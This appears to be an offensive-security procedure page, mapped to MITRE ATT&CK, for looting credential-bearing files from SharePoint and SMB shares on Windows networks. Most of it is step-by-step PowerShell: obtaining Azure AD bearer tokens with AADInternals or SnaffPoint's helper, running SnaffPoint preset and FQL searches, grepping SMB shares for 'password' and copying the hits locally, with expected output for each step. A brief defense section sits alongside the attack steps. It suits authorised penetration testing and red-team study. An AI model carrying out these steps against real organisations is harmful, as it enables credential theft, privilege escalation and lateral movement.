---
id: e537246f-df47-437c-985f-23ca94dadb15
name: Password-Looting-from-SharePoint-and-SMB-Shares
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.955905+00:00'
updated_at: '2023-10-10T20:37:31.822008+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Data from Local System|T1005 - Data from Local System]]'
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/EoP - Looting for passwords]]'
  - '[[tags/Search for file contents]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/retrieve-aadinternals-access-token]]'
  - '[[commands/retrieve-snaffpoint-bearer-token]]'
  - '[[commands/search-sharepoint-with-preset-queries]]'
  - '[[commands/search-sharepoint-with-inline-query]]'
platforms:
  - Windows
tools:
  - '[[tools/SnaffPoint]]'
  - '[[tools/AADInternals]]'
validated: true
---

# Password-Looting-from-SharePoint-and-SMB-Shares

## Summary

This procedure outlines how to loot sensitive files, such as those containing passwords, from SharePoint sites and SMB shares on a Windows domain environment. It leverages tools like SnaffPoint for automated searching and AADInternals for authentication token retrieval, enabling attackers with initial access to discover and extract credentials for privilege escalation.

## Description

In a Windows Active Directory environment integrated with Microsoft 365, SharePoint and SMB shares often store configuration files, documents, and scripts with embedded credentials. This procedure uses SnaffPoint, a tool designed to crawl and identify lootable files in these repositories, combined with authentication via Azure AD tokens. Attackers typically have low-privileged domain access or valid user credentials to initiate searches. The process involves obtaining a bearer token for SharePoint API access, then querying for files matching patterns indicative of passwords (e.g., .config files, password lists). While focused on SharePoint, SnaffPoint can extend to SMB shares by targeting UNC paths. Success allows collection of credentials for lateral movement or escalation, mapping to MITRE ATT&CK for discovery and collection phases.

## Requirements

1. Valid Azure AD credentials with access to the target SharePoint tenant and SMB shares.
2. PowerShell execution policy allowing script runs (e.g., Bypass).
3. Installed tools: SnaffPoint binary and AADInternals PowerShell module.
4. Network access to SharePoint URL (e.g., https://your.sharepoint.com) and SMB shares.

## Defense

- Implement least privilege access to SharePoint sites and SMB shares using Azure AD conditional access policies.
- Enable multi-factor authentication (MFA) for all accounts and monitor token issuance via Azure AD sign-in logs.
- Use Data Loss Prevention (DLP) policies in Microsoft 365 to scan and block sensitive file uploads.
- Monitor for anomalous PowerShell executions and network connections to SharePoint APIs using EDR tools like Microsoft Defender for Endpoint.

## Objectives

1. Obtain authentication tokens for accessing SharePoint and SMB resources.
2. Search and identify files containing potential credentials.
3. Extract and exfiltrate lootable files for offline analysis and privilege escalation.
4. Achieve higher privileges or lateral movement using discovered passwords.

## Instructions

### Step 1: Retrieve Authentication Token

**Context**: Before searching, obtain a bearer token for SharePoint API access. This step uses either the SnaffPoint binary's built-in tool or the AADInternals module to authenticate against Azure AD. The token grants read access to SharePoint content.

Choose one method:

**Command** ([[commands/retrieve-aadinternals-access-token]]):
```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessTokenForExchanging -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")
```

> This installs and uses AADInternals to exchange for a token using the SharePoint client ID. Expected output: A string variable $token containing the bearer token (e.g., eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...).

Alternatively, **Command** ([[commands/retrieve-snaffpoint-bearer-token]]):
```powershell
$token = (.\GetBearerToken.exe https://your.sharepoint.com)
```

> This runs the SnaffPoint helper executable to fetch the token directly. Expected output: Similar bearer token string in $token.

### Step 2: Search SharePoint Using Preset Queries

**Context**: Use predefined search patterns from SnaffPoint's presets directory to scan for common loot files (e.g., configs, passwords). This automates discovery without manual query crafting, targeting sensitive content across the SharePoint site.

**Command** ([[commands/search-sharepoint-with-preset-queries]]):
```powershell
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
```

> Executes SnaffPoint with the SharePoint URL and token, loading presets from ./presets. Why: Presets cover common credential patterns like "password=" or .ini files. Expected output: Console log of scanned paths, matched files, and loot summaries (e.g., "Found: config.xml with potential creds at /sites/shared/docs").

### Step 3: Search SharePoint Using Inline Queries

**Context**: For targeted searches, specify custom queries via command line. Use FQL (Fast Query Language) for precise filtering, such as filename extensions or content keywords, to focus on password-containing files.

**Command** ([[commands/search-sharepoint-with-inline-query]]):
```powershell
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
```

> Runs SnaffPoint with FQL enabled (-l) and query for .config files (-q). Why: Allows refinement based on known file types holding creds; see Microsoft FQL docs for syntax. Expected output: Filtered results showing matching files, paths, and snippets (e.g., "Match: web.config | Path: /sites/app | Content: connectionString with password").

### Step 4: Extend to SMB Shares and Exfiltrate

**Context**: If SMB shares are accessible, adapt SnaffPoint or use native tools to scan UNC paths. Download identified files for analysis. This step verifies and collects loot.

Use PowerShell to access SMB:
```powershell
# Example for SMB scan (adapt SnaffPoint if supported or use dir)
dir \\server\share /s | Select-String -Pattern "password"
# Download file
Copy-Item \\server\share\path\to\file.txt .\
```

> Scans SMB share recursively for password patterns and copies files locally. Expected output: List of matching lines/files; successful copy confirms loot acquisition.

Verify success by reviewing downloaded files for usable credentials.
